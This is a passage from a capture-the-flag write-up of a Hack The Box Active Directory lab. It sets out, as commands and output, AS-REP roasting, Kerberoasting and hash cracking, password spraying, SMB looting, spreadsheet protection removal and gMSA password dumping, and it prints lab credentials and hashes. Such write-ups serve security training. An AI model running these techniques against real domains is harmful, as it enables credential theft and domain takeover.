<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="ex">sharphope</span></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="ex">hope.sharp</span></span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="ex">sharp.hope</span></span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="ex">sharph</span></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="ex">hsharp</span></span>
<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="ex">shope</span></span>
<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="ex">h.sharp</span></span>
<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a><span class="ex">s.hope</span></span>
<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a><span class="ex">hope</span></span>
<span id="cb5-20"><a href="#cb5-20" aria-hidden="true" tabindex="-1"></a><span class="ex">sharp</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Trying to dump hashes with GetNPUsers we find that <strong><code>hope.sharp</code></strong> is a valid user, however PREAUTH is not set.</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>┌──<span class="op">(</span>void㉿void<span class="op">)-[/</span>htb<span class="op">/</span>search<span class="op">]</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>└─$ impacket-GetNPUsers search<span class="op">.</span><span class="fu">htb</span><span class="op">/</span> <span class="op">-</span>usersfile hope-username<span class="op">.</span><span class="fu">txt</span> <span class="op">-</span>format hashcat <span class="op">-</span>dc-ip <span class="dv">10.10</span><span class="op">.</span><span class="dv">11.129</span> <span class="op">-</span>outputfile hash<span class="op">.</span><span class="fu">txt</span>                                 <span class="dv">1</span> ⨯</span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>Impacket v0<span class="op">.</span><span class="dv">9.24</span><span class="op">.</span><span class="fu">dev1</span><span class="op">+</span><span class="dv">20210704.162046</span><span class="op">.</span>29ad5792 <span class="op">-</span> Copyright <span class="dv">2021</span> SecureAuth Corporation</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>-<span class="op">]</span> Kerberos SessionError<span class="op">:</span> KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="op">(</span>Client not found <span class="kw">in</span> Kerberos database<span class="op">)</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>-<span class="op">]</span> Kerberos SessionError<span class="op">:</span> KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="op">(</span>Client not found <span class="kw">in</span> Kerberos database<span class="op">)</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>-<span class="op">]</span> User hope<span class="op">.</span><span class="fu">sharp</span> doesn<span class="st">'t have UF_DONT_REQUIRE_PREAUTH set</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="st">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>To get a quick overview of the domain we can use <code>ldapdomaindump</code>, this will provide data similar to the Windows tool <code>ADsearch.exe</code>.</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ldapdomaindump 10.10.11.129 <span class="at">-u</span> <span class="st">'search.htb\hope.sharp'</span> <span class="at">-p</span> <span class="st">'IsolationIsKey?'</span> <span class="at">-o</span> ldapdump.out</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Connecting to host...</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Binding to host</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Bind OK</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Starting domain dump</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Domain dump finished</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>From the dump we find a few interesting things.. <strong>.. Credentials</strong> <code>hope.sharp:IsolationIsKey?</code> is correct and working.</p>
<p><strong>.. Computers:</strong> ![[Pasted image 20220103134201.png]] ![[Pasted image 20220103134647.png]]</p>
<p><strong>.. Users:</strong> ![[Pasted image 20220103134335.png]] ![[Pasted image 20220103134421.png]] ![[Pasted image 20220103134819.png]] ![[Pasted image 20220103134855.png]] ![[Pasted image 20220103134934.png]]</p>
<p><strong>.. Groups:</strong> ![[Pasted image 20220103135204.png]]</p>
<p>Extract all users to a new .txt list.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search/ldapdump.out]</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> awk <span class="st">'{print $5}'</span> domain_users.grep <span class="op">&gt;</span> domain-users.txt</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Trying password re-use with the list of all valid users over LDAP and SMB fails.</p>
<hr>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>With a valid set of credentials the next logical step for me would be to gather more information about the domain with Bloodhound to see if there are any roastable users, or other weak chains that we can exploit.</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> bloodhound-python <span class="at">-u</span> hope.sharp <span class="at">-p</span> <span class="st">'IsolationIsKey?'</span> <span class="at">-ns</span> 10.10.11.129 <span class="at">-d</span> search.htb <span class="at">-c</span> all</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found AD domain: search.htb</span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Connecting to LDAP server: research.search.htb</span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 1 domains</span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 1 domains in the forest</span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 113 computers</span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Connecting to LDAP server: research.search.htb</span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 106 users</span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 63 groups</span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="ex">INFO:</span> Found 0 trusts</span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Running the raw query <code>MATCH (u:User {hasspn:true}) RETURN u</code> in Bloodhound we find all users that are Kerberoastable, where we get a match on user <code>web_svc</code>.</p>
<p>![[Pasted image 20220104084939.png]]</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> impacket-GetUserSPNs search.htb/Hope.Sharp:IsolationIsKey<span class="pp">?</span> <span class="at">-request</span>   </span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Impacket</span> v0.9.24.dev1+20210704.162046.29ad5792 <span class="at">-</span> Copyright 2021 SecureAuth Corporation</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="ex">ServicePrincipalName</span>               Name     MemberOf  PasswordLastSet             LastLogon  Delegation </span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="ex">---------------------------------</span>  <span class="at">-------</span>  <span class="at">--------</span>  <span class="at">--------------------------</span>  <span class="at">---------</span>  <span class="at">----------</span></span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="ex">RESEARCH/web_svc.search.htb:60001</span>  web_svc            2020-04-09 14:59:11.329031  <span class="op">&lt;</span>never<span class="op">&gt;</span>               </span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="va">$krb5tgs$2</span><span class="ex">3</span><span class="va">$*</span><span class="ex">web_svc</span><span class="va">$SEARCH</span><span class="ex">.HTB</span><span class="va">$search</span><span class="ex">.htb/web_svc*</span><span class="va">$bcaea98d34938aaf0f71290965b41e6c$3</span><span class="ex">2ee2f404583f6ff18c9dfc97fa4bf66c740dfb9ed1f72040dd09e579075dd3413c0a2b4129dfaa17fc1860e82a8e705954a5026985f34b4a42bdb87ae73fcf00ebcd1a7d51f92b0d7d1eb2d590fa105eb7b7e392d26dec89499fd1aff98561cad219c1b928d7093debd78399ddff49908079115704f3814c4b469d278fa500ccdaa1c5fa5c5564e36602f7e7a0ca2d53deafe1f4eaef5362ccc88a321956568648e19a6457b002f08e4244239b57695ad9ab364d54de4944e80ec83827c24fc2e30e76e38733d2182a74ae29f7e08f35dc6365197d2dc2d74417800fa3a519812b991ade1ea45300cf82d1cf5e45083f7bf8e3d628ab68b13f579ce7415bd8cab13728a962d343277a22c1bea5edcbcbab1cec9517322378fb3fdde89576d56b67a84d70039725fc0794f786bbce8adec3daa64f2c6e46d54e0eb19c3192663950e250f50410357fdd5599e4a93cc7b51243f8149a50b65e1504cb3be183ee6c13ca2dbd869ff7305c8fa1018afb2303cdd165c0980fa42704aaffab17a1e2c1dd67a6697b000af3381f1ed2b9b8d0700e4ef59109f2c88e9df232b22c3c143cb92374495fccff957f900bab0326ae7cab850b61c7941c1dbcad1f8f50a804c5c450fba9ffd7b7a7f05b1566f01be596bdd87cd410927c94bf81bdb384fef3d6cde25d0e25f7f390bb8e21e7f2fb4c20ff85d6baa0a849b187ae3bbb28709b369aa279b32b3514e806f3f291ea2bc728a5475e7cf1d142ddc37136108a18d2886b500b12ea9d0cec3bc46aa3f486332084f9e38efef6a3a3089c3540da166cf266f49c4e049ec45b05a93731fca58c209abd5fe862ddfd426f9e6f8ad23c61817b6941588378c029249b25dd513ce691d338b25ac854d0b26046cd9f185216a46b05a8bdadf9f4de035a3222cd680eea13e1cdcfd517165d73d444d08c8a9453c298fe4880029c54897d08a9f45beb8429d71b22af79c3c6fe2c701b279e6444341c17b715840e3d208d6d95b7c7d82973f31c9357363bbf673291bd8e5e8fe933abe6a1ce09348967552d039bcc6302f6ce01966d6af0ed049f84efabdb734db987fed47f75a9ab5e6ceddf58350a999b574531511820c4d78d42c2b3d5914dc98da9acae8841d5a7080fb745161c80005f33d3b19b3c2f9d5ad0f9cf126812fca1385380ff5963d5392dd47b0f2e620127df20fa34e41c602494e2509c9336f8803b22bdd2253ee21632fe21020ca4a4c489e6623fbb8285fe134267a8635ad0efaea60f6dc576d8d887658ded96f0e0d4fa8d82a56f087aca73b1ac99698af69c93f46bd12509f89f840230c6e7dc6bebfd9c08f64e437a77ecff6e1aa92697c6623b6664ac489ceda0932cc64648d255671ea8415ac2a4f142e8a37d26e7c7ed8d4c81b0adbf29135bd60f94095de88e46ff81d9a415967e75be62e1d51098e8b3c5a2ff577ebb6035a50faff9ab2802dd120</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> hashcat <span class="at">-a0</span> <span class="at">-m13100</span> web_svc-hash.txt /usr/share/wordlists/rockyou.txt</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="ex">@3ONEmillionbaby</span></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>                                                 </span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="ex">Session..........:</span> hashcat</span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Status...........:</span> Cracked</span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Hash.Name........:</span> Kerberos 5, etype 23, TGS-REP</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>With the set of credentials <code>web_svc:@3ONEmillionbaby</code> the first thing I’d like to do is spray the other users with the found password.</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> crackmapexec ldap 10.10.11.129 <span class="at">-u</span> domain-users.txt <span class="at">-p</span> <span class="st">'@3ONEmillionbaby'</span> <span class="at">--continue-on-success</span></span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">LDAP</span>        10.10.11.129    389    RESEARCH         <span class="pp">[</span><span class="ss">*</span><span class="pp">]</span> Windows 10.0 Build 17763 x64 <span class="er">(</span><span class="ex">name:RESEARCH</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">domain:search.htb</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">signing:True</span><span class="kw">)</span> <span class="kw">(</span><span class="ex">SMBv1:False</span><span class="kw">)</span></span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="ex">LDAP</span>        10.10.11.129    389    RESEARCH         <span class="pp">[-]</span> search.htb<span class="dt">\T</span>ristan.Davies:@3ONEmillionbaby</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">LDAP</span>        10.10.11.129    389    RESEARCH         <span class="pp">[</span><span class="ss">+</span><span class="pp">]</span> search.htb<span class="dt">\w</span>eb_svc:@3ONEmillionbaby </span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="ex">LDAP</span>        10.10.11.129    389    RESEARCH         <span class="pp">[</span><span class="ss">+</span><span class="pp">]</span> search.htb<span class="dt">\E</span>dgar.Jacobs:@3ONEmillionbaby</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Great another set! Now we have the following three creds: 1. <code>hope.sharp:IsolationIsKey?</code> 2. <code>web_svc:@3ONEmillionbaby</code> 3. <code>edgar.jacobs:@3ONEmillionbaby</code></p>
<hr>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>Next lets look through the SMB shares of all the users.</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> smbclient <span class="at">-L</span> 10.10.11.129 <span class="at">-U</span> hope.sharp                     </span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> WORKGROUP<span class="dt">\h</span>ope.sharp password: </span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Sharename</span>       Type      Comment</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">---------</span>       <span class="at">----</span>      <span class="at">-------</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">ADMIN$</span>          Disk      Remote Admin</span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">C$</span>              Disk      Default share</span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">CertEnroll</span>      Disk      Active Directory Certificate Services share</span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">helpdesk</span>        Disk      </span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">IPC$</span>            IPC       Remote IPC</span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">NETLOGON</span>        Disk      Logon server share </span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">RedirectedFolders$</span> Disk      </span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">SYSVOL</span>          Disk      Logon server share</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> smbclient <span class="dt">\\\\</span>10.10.11.129<span class="dt">\\</span>RedirectedFolders$ <span class="at">-U</span> edgar.jacobs</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> WORKGROUP<span class="dt">\e</span>dgar.jacobs password: </span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Try</span> <span class="st">"help"</span> to get a list of possible commands.</span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\&gt;</span> recurse</span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\&gt;</span> ls</span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="ex">\sierra.frye</span></span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>  <span class="bu">.</span>                                  Dc        0  Thu Nov 18 02:01:46 2021</span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>  <span class="ex">..</span>                                 Dc        0  Thu Nov 18 02:01:46 2021</span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Desktop</span>                           DRc        0  Thu Nov 18 02:08:00 2021</span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Documents</span>                         DRc        0  Fri Jul 31 16:42:19 2020</span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Downloads</span>                         DRc        0  Fri Jul 31 16:45:36 2020</span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>  <span class="ex">user.txt</span>                           Ac       33  Thu Nov 18 01:55:27 2021</span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>  </span>
<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="ex">\edgar.jacobs\Desktop</span></span>
<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>  <span class="bu">.</span>                                 DRc        0  Mon Aug 10 12:02:16 2020</span>
<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>  <span class="ex">..</span>                                DRc        0  Mon Aug 10 12:02:16 2020</span>
<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>  <span class="va">$RECYCLE</span><span class="ex">.BIN</span>                     DHSc        0  Thu Apr  9 22:05:29 2020</span>
<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>  <span class="ex">desktop.ini</span>                      AHSc      282  Mon Aug 10 12:02:16 2020</span>
<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Microsoft</span> Edge.lnk                 Ac     1450  Thu Apr  9 22:05:03 2020</span>
<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Phishing_Attempt.xlsx</span>              Ac    23130  Mon Aug 10 12:35:44 2020</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We are not able to view or download the user flag yet, so instead download <code>Phising_Attempt.xlsx</code> and view the document. We can see that the column C is hidden, and the option to unhide is greyed out - this is because the document is protected. ![[Pasted image 20220104091939.png]]</p>
<p>![[Pasted image 20220104092027.png]]</p>
<p>We can easily bypass this by opening the .xlsx in Kali using Archive Manager. Go to <code>xl</code> &gt; <code>worksheets</code> &gt; open and edit <code>sheet2.xml</code>. Search for <code>sheetProtection</code> and remove the section. Save the file and you should now be able to unhide column C.</p>
<p>![[Pasted image 20220104092957.png]]</p>
<p>![[Pasted image 20220104093251.png]]</p>
<p>Grab user.txt that we found earlier in sierra.frye’s SMB directory.</p>
<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> smbclient <span class="dt">\\\\</span>10.10.11.129<span class="dt">\\</span>RedirectedFolders$ <span class="at">-U</span> sierra.frye </span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="ex">smb:</span> <span class="dt">\s</span>ierra.frye<span class="dt">\&gt;</span> get user.txt</span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="ex">getting</span> file <span class="dt">\s</span>ierra.frye<span class="dt">\u</span>ser.txt of size 34 as user.txt <span class="er">(</span><span class="ex">0.3</span> KiloBytes/sec<span class="kw">)</span> <span class="kw">(</span><span class="ex">average</span> 0.3 KiloBytes/sec<span class="kw">)</span></span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat user.txt             </span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="ex">f50460b2d81200ea8e9242bd6560cf13</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<hr>
</section>
</section>
<section id="root-method-1" class="level1">
<h1>ROOT Method 1</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>Using Bloodhound we look for the Shortest Path to Domain Admin and find that users from ITSEC group (which sierra.frye is member of) have ReadGMSAPassword over user <code>BIR-ADFS-GMSA</code>. ![[Pasted image 20220104095416.png]]</p>
<div class="sourceCode" id="cb16"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/opt/gMSADumper]</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> python3 gMSADumper.py <span class="at">-u</span> sierra.frye <span class="at">-p</span> <span class="st">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="at">-d</span> search.htb                                                              1 ⨯</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Users</span> or groups who can read password for BIR-ADFS-GMSA$:</span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a> <span class="op">&gt;</span> ITSec</span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="ex">BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Since <code>BIR-ADFS-GMSA$</code> have GenericAll to Domain Administrator <code>Tristan.Davies</code>, we are able to change his password to get root flag. With rpcclient we are able to use both pass-the-hash and change passwords, perfect!</p>
